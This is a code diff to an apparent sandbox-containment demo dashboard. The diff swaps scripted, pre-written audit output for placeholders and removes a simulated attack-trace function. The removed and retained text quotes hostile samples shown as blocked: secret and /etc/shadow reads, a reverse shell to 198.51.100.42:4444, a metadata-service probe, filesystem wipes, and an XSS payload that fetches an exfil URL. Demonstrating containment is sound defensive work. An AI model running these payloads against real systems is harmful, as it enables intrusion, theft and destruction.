@@ -203,7 +203,7 @@
             <label for="auditGoalInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">
               Agentic Audit &amp; Verification Goal
             </label>
-            <input id="auditGoalInput" type="text" value="Probe promo &amp; card inputs via HTTP Probe, reproduce bug in pytest, self-heal patch" class="w-full bg-slate-950 border border-slate-700/80 rounded-xl px-3.5 py-2 text-sm text-slate-200 focus:outline-none focus:border-vultr-400" />
+            <input id="auditGoalInput" type="text" value="Test sandbox air-gap, verify code execution, mint SHA-256 receipt" class="w-full bg-slate-950 border border-slate-700/80 rounded-xl px-3.5 py-2 text-sm text-slate-200 focus:outline-none focus:border-vultr-400" />
           </div>
           <div class="lg:col-span-2 flex items-center gap-2">
             <button id="btnRunAudit" onclick="startFullAuditPipeline()" class="flex-1 bg-gradient-to-r from-vultr-500 to-cyan-500 hover:from-vultr-600 hover:to-cyan-600 text-slate-950 font-bold text-sm py-2.5 px-4 rounded-xl shadow-lg shadow-vultr-500/20 transition flex items-center justify-center gap-1.5">
@@ -260,7 +260,7 @@
           <div class="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
             <div class="flex items-center gap-1 bg-slate-950 p-1 rounded-xl border border-slate-800">
               <button id="subTabBrowser" onclick="switchViewportTab('browser')" class="px-3 py-1 rounded-lg text-xs font-semibold transition bg-vultr-500 text-white">
-                🌐 Pattern B: Headless HTTP Probe
+                🌐 Pattern B: Real HTTP attempt, blocked
               </button>
               <button id="subTabCode" onclick="switchViewportTab('code')" class="px-3 py-1 rounded-lg text-xs font-semibold transition text-slate-400 hover:text-white">
                 💻 Pattern A: Code Sandbox
@@ -329,7 +329,7 @@
                   <!-- Vision Model Bounding Box Callout -->
                   <div id="visionAnomalyBox" class="bg-rose-950/70 border-2 border-dashed border-rose-500 rounded-lg p-2.5 relative">
                     <div class="flex items-center justify-between text-[11px] font-bold text-rose-300 mb-1">
-                      <span>🎯 HTTP PROBE RESULT</span>
+                      <span>🎯 SCENARIO: EXPECTED VULNERABILITY</span>
                       <span class="mono">PROBE TARGET: /checkout</span>
                     </div>
                     <p id="visionAnomalyText" class="text-xs text-rose-100 mono">
@@ -341,16 +341,16 @@
                 <!-- Screenshot Filmstrip Controls -->
                 <div class="grid grid-cols-3 gap-2 pt-3">
                   <button id="btnSnap1" onclick="selectBrowserSnapshot(0)" class="p-2 rounded-lg bg-slate-950 border border-vultr-500 text-left transition">
-                    <div class="text-[10px] font-bold text-vultr-400 mono">SNAP #01 · 0.4s</div>
-                    <div class="text-xs text-slate-200 truncate">DOM Recon &amp; Forms</div>
+                    <div class="text-[10px] font-bold text-vultr-400 mono">STAGE #01 · 0.4s</div>
+                    <div class="text-xs text-slate-200 truncate">Containment</div>
                   </button>
                   <button id="btnSnap2" onclick="selectBrowserSnapshot(1)" class="p-2 rounded-lg bg-slate-950 border border-slate-800 hover:border-slate-700 text-left transition">
-                    <div class="text-[10px] font-bold text-rose-400 mono">SNAP #02 · 1.3s</div>
-                    <div class="text-xs text-slate-200 truncate">Payload Injection</div>
+                    <div class="text-[10px] font-bold text-rose-400 mono">STAGE #02 · 1.3s</div>
+                    <div class="text-xs text-slate-200 truncate">Sandbox Exec</div>
                   </button>
                   <button id="btnSnap3" onclick="selectBrowserSnapshot(2)" class="p-2 rounded-lg bg-slate-950 border border-slate-800 hover:border-slate-700 text-left transition">
-                    <div class="text-[10px] font-bold text-emerald-400 mono">SNAP #03 · 2.8s</div>
-                    <div class="text-xs text-slate-200 truncate">Post-Patch Verify</div>
+                    <div class="text-[10px] font-bold text-emerald-400 mono">STAGE #03 · 2.8s</div>
+                    <div class="text-xs text-slate-200 truncate">Receipt</div>
                   </button>
                 </div>
               </div>
@@ -744,9 +744,9 @@ open("/bin/sh", "wb").write(b"0")</pre>
               <rect x="500" y="45" width="232" height="205" rx="12" fill="url(#sandboxGrad)" stroke="#f43f5e" stroke-width="2"/>
               <text x="515" y="68" fill="#fda4af" font-family="JetBrains Mono" font-size="11" font-weight="bold">ISOLATED SANDBOX ZONE</text>
               <rect x="515" y="82" width="202" height="68" rx="8" fill="#090d16" stroke="#fb7185" stroke-width="1"/>
-              <text x="525" y="102" fill="#ffffff" font-family="Inter" font-size="11" font-weight="bold">Pattern B: HTTP Probe Container</text>
-              <text x="525" y="120" fill="#cbd5e1" font-family="JetBrains Mono" font-size="9.5">Headless HTTP Probe</text>
-              <text x="525" y="136" fill="#fda4af" font-family="JetBrains Mono" font-size="9.5">Target-Only Ingress</text>
+              <text x="525" y="102" fill="#ffffff" font-family="Inter" font-size="11" font-weight="bold">Containment Test: Air-Gapped Probe</text>
+              <text x="525" y="120" fill="#cbd5e1" font-family="JetBrains Mono" font-size="9.5">Real HTTP attempt, blocked</text>
+              <text x="525" y="136" fill="#fda4af" font-family="JetBrains Mono" font-size="9.5">by --network none</text>
 
               <rect x="515" y="162" width="202" height="72" rx="8" fill="#090d16" stroke="#fbbf24" stroke-width="1"/>
               <text x="525" y="182" fill="#ffffff" font-family="Inter" font-size="11" font-weight="bold">Pattern A: Code Container</text>
@@ -921,7 +921,7 @@ cd backend &amp;&amp; nohup python3 -m uvicorn main:app --host 0.0.0.0 --port 80
         { id: 2, title: '2. Containment Test: Sandbox Cannot Reach Target', detail: 'Real HTTP attempt, blocked by --network none', status: 'PENDING' },
         { id: 3, title: '3. HTTP Probe Triage', detail: 'Verify probe response & state', status: 'PENDING' },
         { id: 4, title: '4. Pattern A: Pytest Exploit Repro', detail: 'Confirm bug in isolated container', status: 'PENDING' },
-        { id: 5, title: '5. Self-Healing Code Patch', detail: 'Synthesize & re-test patch', status: 'PENDING' },
+        { id: 5, title: '5. Sandbox Verification', detail: 'Verify code execution in isolated container', status: 'PENDING' },
         { id: 6, title: '6. Human Approval & Receipt', detail: 'Await operator sign-off', status: 'RUNNING' }
       ],
       receipts: []
@@ -930,7 +930,7 @@ cd backend &amp;&amp; nohup python3 -m uvicorn main:app --host 0.0.0.0 --port 80
     const SCENARIOS = {
       finflow: {
         url: 'https://staging-finflow.vultr-demo.internal/checkout',
-        goal: 'Probe promo & card inputs via HTTP Probe, reproduce bug in pytest, self-heal patch',
+        goal: 'Test sandbox air-gap, verify code execution, mint SHA-256 receipt',
         appTitle: 'FinFlow Enterprise Checkout v2.4',
         input1: "<img src=x onerror=fetch('http://10.0.0.1/exfil')>",
         input2: 'promo_discount = -9999.00 (Concurrent Thread #4)',
@@ -1068,7 +1068,7 @@ PASS: CSV Formula Injection neutralized inside sandbox.`,
       },
       custom: {
         url: 'https://your-staging-app.vultr.app/api/checkout',
-        goal: 'Run full Pattern B HTTP Probe sweep + Pattern A self-healing verification',
+        goal: 'Test sandbox air-gap and verify code execution in an isolated container',
         appTitle: 'Custom Target Staging Environment',
         input1: '<svg onload=window.__probe=1>',
         input2: '{"amount": -1, "currency": "USD"}',
@@ -1197,7 +1197,7 @@ PASS: Zero secrets exposed inside ephemeral container.`,
     function switchViewportTab(tab) {
       state.activeViewport = tab;
       const map = {
-        browser: { view: 'viewportBrowser', btn: 'subTabBrowser', label: '🌐 Pattern B: Headless HTTP Probe' },
+        browser: { view: 'viewportBrowser', btn: 'subTabBrowser', label: '🌐 Pattern B: Real HTTP attempt, blocked' },
         code: { view: 'viewportCode', btn: 'subTabCode', label: '💻 Pattern A: Code Sandbox' },
         diff: { view: 'viewportDiff', btn: 'subTabDiff', label: '🛡️ Patch & Approval Gate' }
       };
@@ -1252,12 +1252,12 @@ PASS: Zero secrets exposed inside ephemeral container.`,
       document.getElementById('mockInputBox2').textContent = sc.input2;
       document.getElementById('visionAnomalyText').textContent = sc.visionText;
       document.getElementById('sandboxCodeEditor').value = sc.code;
-      document.getElementById('sandboxTerminalOutput').textContent = sc.terminalOutput;
-      document.getElementById('patchDiffViewer').textContent = sc.diff;
+      document.getElementById('sandboxTerminalOutput').textContent = '// No execution yet. Click "Run in Sandbox" or "Dispatch Audit".';
+      document.getElementById('patchDiffViewer').textContent = '// No patch yet. Run an audit first. Self-healing patch synthesis is a future feature; this MVP demonstrates containment + receipt.';
       document.getElementById('browserAddressBar').textContent = `http://64.177.42.65:8000/?target=${encodeURIComponent(sc.url)}&sb=${state.containerId}`;
 
       const rBox = document.getElementById('reasoningLogBox');
-      rBox.innerHTML = sc.reasoning.map((line) => `<div class="border-l-2 border-vultr-500 pl-2 py-0.5">${escapeHtml(line)}</div>`).join('');
+      rBox.innerHTML = '<div class="border-l-2 border-vultr-500 pl-2 py-0.5">// Reasoning appears here after a real audit dispatch. Nothing here is pre-written.</div>';
     }
 
     function handleScenarioChange() {
@@ -1272,19 +1272,19 @@ PASS: Zero secrets exposed inside ephemeral container.`,
     function selectBrowserSnapshot(index) {
       const snaps = [
         {
-          status: 'SNAP #01 · DOM Recon (14 inputs mapped)',
-          vision: 'Mapped form inputs #promoCode, #cardNumber, and #submitBtn inside isolated Chromium.',
-          badge: 'RECON COMPLETE'
+          status: 'STAGE #01 · Containment',
+          vision: 'SCENARIO: EXPECTED VULNERABILITY — see scenario description. No browser, no DOM inspection.',
+          badge: 'CONTAINMENT'
         },
         {
-          status: 'SNAP #02 · Boundary & XSS Injection',
+          status: 'STAGE #02 · Sandbox Exec',
           vision: SCENARIOS[state.activeScenario].visionText,
-          badge: 'ANOMALY DETECTED'
+          badge: 'SANDBOX EXEC'
         },
         {
-          status: 'SNAP #03 · Post-Patch Visual Verification',
-          vision: 'Verified: HTML entities escaped safely in DOM and subtotal bounded at >= $0.00.',
-          badge: 'PATCH VERIFIED'
+          status: 'STAGE #03 · Receipt',
+          vision: 'Receipt minted from the real sandbox run — SHA-256 in Verified Receipts.',
+          badge: 'RECEIPT MINTED'
         }
       ];
       const chosen = snaps[index] || snaps[0];
@@ -1339,6 +1339,8 @@ PASS: Zero secrets exposed inside ephemeral container.`,
         appendReasoningLine(`[PATTERN A] Code container ${codeRes.container_id} exit ${codeRes.exit_code} — ${codeRes.stdout || ''}`);
         appendReasoningLine(`[RECEIPT] Pattern B SHA-256 ${(probe.sha256_receipt||'').slice(0,16)}... | Pattern A SHA-256 ${(codeRes.sha256_receipt||'').slice(0,16)}...`);
         state.lastAuditReceipt = codeRes.sha256_receipt || probe.sha256_receipt;
+        document.getElementById('sandboxTerminalOutput').textContent = (codeRes.stdout || '') + '\n[container ' + (codeRes.container_id || '') + ' exit ' + (codeRes.exit_code ?? '') + ']';
+        document.getElementById('patchDiffViewer').textContent = '// Real audit output above. No patch was applied in this MVP — the receipt is the proof of containment + verification.';
         if (codeRes.container_id) { state.containerId = codeRes.container_id; document.getElementById('activeContainerBadge').textContent = `container: ${state.containerId}`; }
         const sc = SCENARIOS[state.activeScenario] || SCENARIOS.finflow;
         const stepViews = ['browser', 'browser', 'browser', 'code', 'diff', 'diff'];
@@ -1347,7 +1349,6 @@ PASS: Zero secrets exposed inside ephemeral container.`,
           renderPipelineSteps();
           switchViewportTab(stepViews[i]);
           if (i < 3) selectBrowserSnapshot(i);
-          if (sc.reasoning[i]) appendReasoningLine(sc.reasoning[i]);
           appendSecurityLog(`[STEP ${i + 1}/6] Container ${state.containerId}: ${state.pipelineSteps[i].title} -> OK`);
           updateTelemetryDataPoint(55 + i * 8, 18 + i * 4);
           playTelemetrySound('step');
@@ -1482,90 +1483,10 @@ PASS: Zero secrets exposed inside ephemeral container.`,
           return;
         }
       } catch (e) { state.containmentRunning = false; appendSecurityLog('[ERROR] Sandbox unreachable — check backend health at /api/health'); showToast('⚠️', 'Sandbox unreachable — check backend health'); return; }
+      appendSecurityLog('[WARN] Containment endpoint returned non-OK');
       state.containmentRunning = false;
       return;
     }
-    function runContainmentAttackSimulated(type) {
-      rotateContainerId();
-      const traceEl = document.getElementById('labTerminalTrace');
-      const verdictEl = document.getElementById('labVerdictBadge');
-      const stateTitle = document.getElementById('labSandboxStateTitle');
-
-      const attacks = {
-        secrets: {
-          banner: `Containment Moment: Blocked host secret exfiltration (VULTR_API_KEY & /etc/shadow) in ${state.containerId}.`,
-          ramSpike: 78,
-          cpuSpike: 34,
-          verdict: 'SECRET THEFT BLOCKED (0 KEYS EXPOSED)',
-          trace: `[00.00s] Spawning ephemeral container ${state.containerId} (--network=none --read-only)
-[00.04s] Executing untrusted payload:secret_exfil_probe.py inside sandbox...
-[00.09s] > print(os.environ.get("VULTR_API_KEY")) -> None (Zero host env vars mounted in container!)
-[00.12s] > open("/etc/shadow", "r") -> PermissionError: [Errno 13] Permission denied (Docker seccomp trap)
-[00.15s] > open("/proc/1/environ", "r") -> Blocked by isolated PID namespace (--pids-limit 64)
-[00.19s] [CONTAINMENT ENGINE] Security policy violation trapped.
-[00.21s] [LIFECYCLE] Executed 'docker rm -f ${state.containerId}'. Ephemeral filesystem wiped.
-[RESULT] Vultr Host Control Plane API Keys: 100% SAFE | Blast Radius: 0.00%`
-        },
-        memory: {
-          banner: `Containment Moment: 1GB Memory Bomb killed at 256MB cgroup limit in ${state.containerId} (0.18s).`,
-          ramSpike: 256,
-          cpuSpike: 50,
-          verdict: 'OOM & PID BOMB TRAPPED @ 256MB CAP',
-          trace: `[00.00s] Spawning ephemeral container ${state.containerId} (--memory=256m --memory-swap=256m --cpus=0.5 --pids-limit=64)
-[00.05s] Executing untrusted payload: memory_bomb.py
-[00.08s] Container RSS memory climbing: 64MB -> 148MB -> 232MB -> 256MB (HARD CGROUP CEILING HIT!)
-[00.11s] [KERNEL CGROUP V2] Memory cgroup out of memory: Killed process 14 (python3) total-vm:262144kB
-[00.14s] [CONTAINED] MemoryError caught at cgroup ceiling (256MB cap)
-[00.18s] [LIFECYCLE] Container ${state.containerId} terminated (Exit Code 137) and purged automatically.
-[RESULT] Vultr Host VM Memory Unchanged (1.1GB / 8.0GB) | Web App Latency: 0ms degradation`
-        },
-        network: {
-          banner: `Containment Moment: Outbound C2 Reverse Shell (198.51.100.42:4444) blocked by --network none in ${state.containerId}.`,
-          ramSpike: 64,
-          cpuSpike: 28,
-          verdict: 'EGRESS REVERSE SHELL BLOCKED',
-          trace: `[00.00s] Spawning ephemeral container ${state.containerId} with air-gapped network namespace (--network none)
-[00.04s] Executing untrusted payload: reverse_shell_c2.py
-[00.07s] > socket.connect(("198.51.100.42", 4444))
-[00.08s] [NETNS INTERCEPT] OSError: [Errno 101] Network is unreachable (Only lo 127.0.0.1 interface exists)
-[00.11s] > urllib.request.urlopen("http://169.254.169.254/v1.json") (Cloud Metadata Service probe)
-[00.12s] [NETNS INTERCEPT] Blocked! Instance metadata link-local IP is completely unreachable from sandbox.
-[00.17s] [LIFECYCLE] Container ${state.containerId} destroyed & recycled.
-[RESULT] Zero unauthorized packets left the container | Blast Radius: 0.00%`
-        },
-        filesystem: {
-          banner: `Containment Moment: Root filesystem wipe (rm -rf /usr) blocked by --read-only rootfs in ${state.containerId}.`,
-          ramSpike: 70,
-          cpuSpike: 31,
-          verdict: 'READ-ONLY ROOTFS PROTECTED HOST',
-          trace: `[00.00s] Spawning ephemeral container ${state.containerId} (--read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m)
-[00.05s] Executing untrusted payload: wipe_filesystem.py
-[00.08s] > shutil.rmtree("/usr") -> OSError: [Errno 30] Read-only file system: '/usr'
-[00.11s] > open("/bin/sh", "wb") -> OSError: [Errno 30] Read-only file system: '/bin/sh'
-[00.14s] > Attempting binary execution from /tmp/dropper.elf -> PermissionError: /tmp mounted with 'noexec'
-[00.20s] [LIFECYCLE] Container ${state.containerId} destroyed & fresh image layer ready in 0.20s.
-[RESULT] Host OS & Base Container Image 100% Intact | Blast Radius: 0.00%`
-        }
-      };
-
-      const atk = attacks[type] || attacks.memory;
-      traceEl.textContent = atk.trace;
-      verdictEl.textContent = atk.verdict;
-      verdictEl.className = 'px-2.5 py-0.5 rounded-full text-xs font-bold bg-rose-500/25 text-rose-300 border border-rose-500/40 mono';
-      stateTitle.textContent = atk.verdict;
-
-      updateTelemetryDataPoint(atk.ramSpike, atk.cpuSpike);
-      // Drop back down immediately after container purge to show recovery!
-      setTimeout(() => {
-        updateTelemetryDataPoint(48, 14);
-      }, 900);
-
-      triggerContainmentBanner(atk.banner);
-      appendSecurityLog(`[CONTAINMENT MOMENT] ${atk.verdict} in ${state.containerId}`);
-      playTelemetrySound('alert');
-      showToast('🛡️', atk.verdict);
-    }
-
     async function runFullContainmentVideoSequence() {
       const sequence = ['secrets', 'memory', 'network', 'filesystem'];
       showToast('🎬', 'Starting automated 4-stage Containment Moment demo sequence...');
